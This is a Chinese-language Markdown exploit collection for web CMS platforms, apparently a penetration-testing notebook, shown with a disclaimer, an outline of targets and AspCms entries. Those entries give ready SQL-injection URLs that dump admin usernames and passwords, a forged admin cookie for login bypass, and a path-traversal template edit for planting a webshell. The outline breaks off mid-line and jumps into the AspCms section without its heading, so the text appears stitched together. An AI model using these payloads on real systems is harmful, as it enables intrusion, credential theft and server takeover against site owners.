# B/S - Exploits
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* **[各类论坛/CMS框架](#各类论坛/cms框架)**
    * [AEM](#aem)
    * [74CMS](#74cms)
    * [dedeCMS](#dedecms)
    * [Discuz](#discuz)
        * [Discuz](#discuz)
        * [Discuz!ML](#discuz!ml)
    * [Drupal](#drupal)
    * [ECshop](#ecshop)
    * [Fastadmin](#fastadmin)
    * [Laravel](#laravel)
    * [jeecg](#jeecg)
    * [jeewms](#jeewms)
    * [Joomla](#joomla)
    * [Maccms](#maccms)
    * [MetInfo](#metInfo)
    * [October](#october)
    * [php7cms](#php7cms)
    * [RuoYi](#ruoyi)
    * [SeaCMS](#seacms)
    * [ShopXO](#shopxO)
    * [Sitecore](#sitecore)
    * [SiteServer](#siteserver)
    * [ThinkAdmin](#thinkadmin)
    * [ThinkCMF](#thinkcmf)
    * [ThinkPHP](#thinkphp)
        * [ fofa: Powered by AspCms2
**AspCms1.5 版以下注入漏洞**
- POC | Payload | exp
    ```bash
    # 爆用户名 EXP
    http://www.***.com/plug/productbuy.asp?id=2+union+select+1,2,LoginName,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+AspCms_User+where+userid=1
    这是爆 ID=1 的账户名，如果发现权限不够可以往后试 2,3,4………..
    # 爆密码
    http://www.xxx.com/plug/productbuy.asp?id=2+union+select+1,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37+from+AspCms_User+where+userid=1
    后台登录地址：/admin/login.asp
    后台拿 shell
    1. 直接上传`.asp;x`
    2. 系统配置信息
    3. 模版管理新建 `1.asp` 模板，内容写马的内容.
    ```
**AspCms2.1.4 GBK 版,未验证权限、且存在注入漏洞**
- POC | Payload | exp
    ```
    admin/_content/_About/AspCms_AboutEdit.asp
    ```
    ```
    http://www.xxx.com/admin/_content/_About/AspCms_AboutEdit.asp?id=19 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24 from aspcms_user where userid=1
    ```
**AspCms2.0未验证权限，且存在注入漏洞**
- POC | Payload | exp
    ```
    admin/_content/_About/AspCms_AboutEdit.asp?id=19
    ```
    - 表名：aspcms_user
    - 列名：loginname、password
    ```
    http://www.xxx.com/admin/_content/_About/AspCms_AboutEdit.asp?id=19 and 1=2 union select 1,2,3,4,5,loginname,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,password,25,26,27,28,29,30,31,32,33,34,35 from aspcms_user where userid=1
    ```
**Cookies 欺骗**
- POC | Payload | exp
    ```
    cookies:username=admin; ASPSESSIONIDAABTAACS=IHDJOJACOPKFEEENHHMJHKLG; LanguageAlias=cn; LanguagePath=%2F; languageID=1; adminId=1; adminName=admin; groupMenu=1%2C+70%2C+10%2C+11%2C+12%2C+13%2C+14%2C+20%2C+68%2C+15%2C+16%2C+17%2C+18%2C+3%2C+25%2C+57%2C+58%2C+59%2C+2%2C+21%2C+22%2C+23%2C+24%2C+4%2C+27%2C+28%2C+29%2C+5%2C+49%2C+52%2C+56%2C+30%2C+51%2C+53%2C+54%2C+55%2C+188%2C+67%2C+63%2C+190%2C+184%2C+86%2C+6%2C+32%2C+33%2C+34%2C+8%2C+37%2C+183%2C+38%2C+60%2C+9; GroupName=%B3%AC%BC%B6%B9%DC%C0%ED%D4%B1%D7%E9
    ```
**进入后台后GetShell**
- POC | Payload | exp
    所有版本存在后台编辑风格 可以修改任意文件，获取webshell就很简单了
    ```
    http://www.xxx.com/AspCms_TemplateEdit.asp?acttype=&filename=../../../index.asp
    ```
    插入`asp;x`文件蚁剑连接即可。
---
### dedeCMS
> 官网 : http://www.dedecms.com/
**相关工具**
- [lengjibo/dedecmscan](https://github.com/lengjibo/dedecmscan) - 织梦全版本漏洞扫描工具
**相关文章**
- [解决DEDECMS历史难题--找后台目录](https://xz.aliyun.com/t/2064)
- [Dedecms 最新版漏洞收集并复现学习](https://blog.szfszf.top/article/25/)
**5.8.1 rce**